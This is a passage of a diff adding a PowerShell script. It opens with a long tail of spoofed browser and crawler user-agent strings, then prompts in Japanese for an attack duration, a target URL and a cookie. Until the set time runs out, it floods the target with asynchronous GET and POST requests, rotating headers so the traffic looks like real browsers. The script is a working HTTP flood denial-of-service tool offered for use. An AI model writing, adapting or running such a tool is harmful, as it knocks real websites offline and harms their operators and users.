+@Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)
+@Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10
+@Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4
+@Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0
+@Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10
+@Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)
+@Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+@Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)
+@Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)
+@Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16
+@Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
+@Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)
+@Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
+@Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)
+@Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)
+@Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7
+@BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0
+@Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)
+@Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)
+@Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)
+@Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10
+@Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)
+@Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007
+@BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179
+@Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620
+@Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com
+@Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)
+@Mozilla/4.0 (compatible; Arachmo)
+@Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)
+@Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+@Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
+@Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
+@BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)
+@Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
+@Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)
+@Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)
+@Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
+@Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
+@Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
+@Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
+@Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)
+@Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)
+@Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
+@Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1
+@Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)
+@Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
+@Mozilla/5.0 (PLAYSTATION 3; 3.55)
+@Mozilla/5.0 (PLAYSTATION 3; 2.00)
+@Mozilla/5.0 (PLAYSTATION 3; 1.00)
+@Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0
+@Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)
+@SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)
+@iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)
+@iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)
+@Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) 
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))
+@Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)
+@Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)
+@Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8
+@Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)
+@Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
+@Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
+@Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
+@Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
+@Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413
+"
+
+$platform = @('"Windows"', '"Android"', '"Android"', '"Chrome OS"', '"Chromium OS"', '"iOS"', '"Linux"', '"macOS"', '"Windows"')
+$device = @("?1", "?0")
+$origin = @("same-origin", "cross-origin")
+
+clear
+$timemin = (Read-Host 半角で攻撃時間[分]を入力してください。)
+$url = (Read-Host 半角でurlをhttp/httpsから入力してください。)
+$cookie = (Read-Host Cookieを送信する場合は入力してください。)
+
+$limit =(Get-date).AddMinutes("$timemin")
+$UA = $UAs.Split('@')
+$REFERER = $referers.Split('@')
+$ACCEPT = $acceptall.Split('@')
+$byte = [byte[]](1..255)
+
+function http_getpost {
+$random = Get-Random -Minimum 1 -Maximum 434
+$random2 = Get-Random -Minimum 1 -Maximum 11
+$web = New-Object System.Net.WebClient
+$web.Headers.Add("Cache-Control", "no-store")
+$web.Headers.Add("UserAgent", $UA[$random])
+$web.Headers.Add("Referer", $REFERER[$random])
+$web.Headers.Add("Accept", $ACCEPT[$random2])
+$web.Headers.Add("Content-Type", "application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest")
+$web.Headers.Add("Accept-Language", "en-US,en;q=0.5")
+$web.Headers.Add("Accept-Encoding", "gzip, deflate")
+$web.Headers.Add("Sec-Ch-Ua-Mobile", ($device|Get-Random))
+$web.Headers.Add("Upgrade-Insecure-Requests", "1")
+$web.Headers.Add("Sec-Ch-Ua-Platform", ($platform|Get-Random))
+$web.Headers.Add("Sec-Fetch-Dest", "document")
+$web.Headers.Add("Sec-Fetch-Mode", "navigate")
+$web.Headers.Add("Sec-Fetch-User", "?1")
+$web.Headers.Add("Sec-Fetch-Site", ($origin|Get-Random)) 
+$web.Headers.Add("Sec-Ch-Ua", '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"')
+$web.DownloadDataAsync($url)
+$web = New-Object System.Net.WebClient
+$web.Headers.Add("UserAgent", $UA[$random])
+$web.Headers.Add("Keep-Alive", 300)
+$web.Headers.Add("Accept", $ACCEPT[$random2])
+$web.Headers.Add("Accept-Language", "en-US,en;q=0.5")
+$web.Headers.Add("Accept-Encoding", "gzip, deflate")
+$web.Headers.Add("Content-Type", "text/plain")
+$web.Headers.Add("Accept-Charset", "Shift_JIS,utf-8;q=0.7,*;q=0.7")
+$web.Headers.Add("Cookie", $cookie)
+$web.UploadDataAsync($url, $byte)
+}
+
+while ( (Get-Date) -le $limit ) {
+http_getpost
+}
